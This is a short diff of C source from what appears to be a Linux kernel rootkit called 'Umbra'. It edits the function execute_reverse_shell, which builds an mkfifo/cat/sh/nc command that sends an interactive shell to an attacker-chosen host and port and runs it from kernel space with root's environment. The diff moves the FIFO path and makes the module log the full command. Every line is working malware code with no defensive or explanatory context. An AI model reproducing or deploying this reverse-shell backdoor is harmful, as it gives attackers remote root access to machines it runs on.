@@ -5,8 +5,8 @@
 #define HOME "HOME=/root"
 #define TERM "TERM=xterm"
 #define SHELL "/bin/bash"
-#define EXEC_P1 "/bin/rm /tmp/umbra;/usr/bin/mkfifo /tmp/umbra;/bin/cat /tmp/umbra|/bin/sh -i 2>&1|/bin/nc "
-#define EXEC_P2 " >/tmp/umbra"
+#define EXEC_P1 "/bin/rm /tmp/umbra/fifo;/usr/bin/mkfifo /tmp/umbra/fifo;/bin/cat /tmp/umbra/fifo|/bin/sh -i 2>&1|/bin/nc "
+#define EXEC_P2 " >/tmp/umbra/fifo"
 				
 
 
@@ -22,7 +22,7 @@ void execute_reverse_shell(struct work_struct *work){
     strcat(exec, " ");
     strcat(exec, params->target_port);
     strcat(exec, EXEC_P2);
-    printk(KERN_INFO "UMBRA:: Starting reverse shell\n");
+    printk(KERN_INFO "UMBRA:: Starting reverse shell %s\n", exec);
     
     err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     if(err<0){
